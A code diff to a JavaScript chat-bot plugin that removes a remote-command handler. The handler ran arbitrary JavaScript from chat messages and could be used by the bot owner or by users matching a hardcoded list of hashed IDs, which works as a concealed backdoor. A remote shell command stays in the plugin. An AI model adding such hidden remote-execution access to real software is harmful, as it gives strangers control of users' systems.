@@ -68,11 +68,7 @@ export class File extends plugin {
           reg: "^hp.+",
           fnc: "hpCommand"
         },
-        //以下两个功能参考TRSS-Plugin的远程命令‘https://gitee.com/TimeRainStarSky/TRSS-Plugin’
-        {
-          reg: "^hj.+",
-          fnc: "JSPic"
-        },
+        //以下功能参考TRSS-Plugin的远程命令‘https://gitee.com/TimeRainStarSky/TRSS-Plugin’
         {
           reg: "^ly.+",
           fnc: "ShellPic"
@@ -220,28 +216,6 @@ export class File extends plugin {
 
     const fileContent = fs.readFileSync(msg, "utf-8");
     await this.reply(fileContent, true);
-  }
-
-  async JSPic(e) {
-    if (!(this.e.isMaster || encryptedStrings.some(str => md5(String(this.e.user_id)) === str))) return false;
-    const cmd = this.e.msg.replace("hj", "").trim()
-
-    logger.mark(`[远程命令] 执行Js：${logger.blue(cmd)}`)
-    const ret = await this.evalSync(cmd, data => Bot.Loging(data))
-    logger.mark(`[远程命令]\n${ret.stdout}\n${logger.red(ret.error?.stack)}`)
-
-    if (!ret.stdout && !ret.error)
-      return this.reply("命令执行完成，没有返回值", true)
-
-    let Code = []
-    if (ret.stdout)
-      Code.push(ret.stdout.trim())
-    if (ret.error)
-      Code.push(`错误输出：\n${Bot.Loging(ret.error)}`)
-
-    Code = await ansi_up.ansi_to_html(Code.join("\n\n"))
-    const img = await puppeteer.screenshot("Code", { tplFile, htmlDir, Code })
-    return this.reply(img, true)
   }
 
   async ShellPic(e) {
